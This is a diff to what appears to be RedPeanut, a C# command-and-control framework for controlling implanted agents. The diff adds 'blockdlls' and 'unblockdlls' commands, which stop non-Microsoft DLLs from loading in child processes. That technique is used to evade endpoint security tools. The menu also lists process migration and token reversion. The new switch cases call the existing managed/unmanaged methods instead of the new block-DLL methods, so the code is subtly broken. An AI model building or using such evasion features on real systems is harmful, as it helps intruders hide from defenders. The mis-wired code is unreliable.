@@ -25,6 +25,8 @@ namespace RedPeanut
             { "killagent", "Kill current agent" },
             { "managed", "Agent will run task in managed mode" },
             { "unmanaged", "Agent will run task in unmanaged mode" },
+            { "blockdlls", "Agent block non Microsoft Dlls in child process" },
+            { "unblockdlls", "Agent not block non Microsoft Dlls in child process" },
             { "migrate", "Migrate to another process" },
             { "reverttoself", "Revert all token" }
         };
@@ -85,6 +87,12 @@ namespace RedPeanut
                             RunSetManaged();
                             return true;
                         case "unmanaged":
+                            RunSetUnManaged();
+                            return true;
+                        case "blockdlls":
+                            RunSetManaged();
+                            return true;
+                        case "unblockdlls":
                             RunSetUnManaged();
                             return true;
                         case "migrate":
@@ -182,6 +190,44 @@ namespace RedPeanut
             injectionManagedTask.Managed = false;
 
             msg.InjectionManagedTask = injectionManagedTask;
+
+            agent.SendCommand(msg);
+
+            agent.Managed = false;
+        }
+
+        private void RunSetBlockDll()
+        {
+            TaskMsg msg = new TaskMsg
+            {
+                Instanceid = RandomAString(10, new Random()),
+                Agentid = agent.AgentId,
+                TaskType = "blockdlls"
+            };
+
+            BlockDlls blockDllsTask = new BlockDlls();
+            blockDllsTask.Block = true;
+
+            msg.BlockDllsTask = blockDllsTask;
+
+            agent.SendCommand(msg);
+
+            agent.Managed = true;
+        }
+
+        private void RunSetUnBlockDll()
+        {
+            TaskMsg msg = new TaskMsg
+            {
+                Instanceid = RandomAString(10, new Random()),
+                Agentid = agent.AgentId,
+                TaskType = "blockdlls"
+            };
+
+            BlockDlls blockDllsTask = new BlockDlls();
+            blockDllsTask.Block = false;
+
+            msg.BlockDllsTask = blockDllsTask;
 
             agent.SendCommand(msg);
 
